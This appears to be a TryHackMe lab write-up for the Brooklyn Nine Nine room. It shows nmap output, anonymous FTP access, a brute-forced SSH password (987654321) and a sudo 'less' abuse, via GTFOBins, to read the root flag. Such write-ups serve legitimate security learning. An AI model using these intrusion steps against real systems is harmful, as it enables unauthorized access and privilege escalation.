@@ -1,0 +1,131 @@
+This is a writeup for the Brooklynn 99 room on tryhackme.com
+
+It is rated as an easy room and has two main intended ways in
+
+We need to find 2 flags, seems normal enough
+
+nmap -sV -sS -A 10.10.204.97
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-18 07:08 SAST
+Nmap scan report for 10.10.204.97
+Host is up (0.15s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.9.5.109
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
+|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
+|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=5/18%OT=21%CT=1%CU=30044%PV=Y%DS=2%DC=T%G=Y%TM=60A34BE
+OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
+OS:(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST1
+OS:1NW7%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
+OS:(R=Y%DF=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+
+Network Distance: 2 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   156.07 ms 10.9.0.1
+2   155.86 ms 10.10.204.97
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 33.31 seconds
+
+There's a web page and an ftp port that will allow anonymous.
+
+I took a quick look at the website to see what kind of thing we're dealing with. The code says "Have you ever heard of steganograpyh?" 
+
+So that's a pretty solid hint. While I go see what's in the ftp server I'm going to run a gobuster scan on the website.
+
+And the classic anonymous:anonymous credentials get us into the ftp server
+
+ftp 10.10.204.97
+
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
+226 Directory send OK.
+ftp> get note_to_jake.txt
+local: note_to_jake.txt remote: note_to_jake.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
+226 Transfer complete
+
+and there's a note to jake in that ftp server which is great.
+
+From Amy,
+
+Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
+
+This tells me that I could probably brute force a login for Jake especially given knowledge of the series.
+
+SO while the brute force runs. I found nothing with the gobuster scan so I'm not going to include it. I downloaded the image we see on the website and look for any steganography stuff I can find.
+
+The brute forcing worked, jake had a terrible password.
+ACCOUNT FOUND: [ssh] Host: 10.10.204.97 User: jake Password: 987654321 [SUCCESS]
+
+so now we can ssh into the machine
+
+Once we're in we can navigate to holt's account in the machine and the user flag is there.
+
+
+-----------------------------------------------------
+PRIVLEDGE ESCALATION
+
+So we have the user flag, now we need to find the root flag.
+sudo -l
+Matching Defaults entries for jake on brookly_nine_nine:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jake may run the following commands on brookly_nine_nine:
+    (ALL) NOPASSWD: /usr/bin/less
+
+So jake can run less with no passwd. So i'm going to check gtfobins to see how I can use this to get the root flag and so the first thing I'm going to try do is just read the root flag because that's just an easy win to the CTF
+
+File read
+
+It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.
+
+    less file_to_read
+
+    This is useful when less is used as a pager by another binary to read a different file.
+
+    less /etc/profile
+    :e file_to_read
+
+less /root/root.txt
+
+and the flag is there. That was a really fun box. Quick and easy.
+
+If you want to become root instead of just reading the flag the less page on gtfobins has a way to escalate your privledges. Just go take a look at it.
+
+Enjoy Hacking
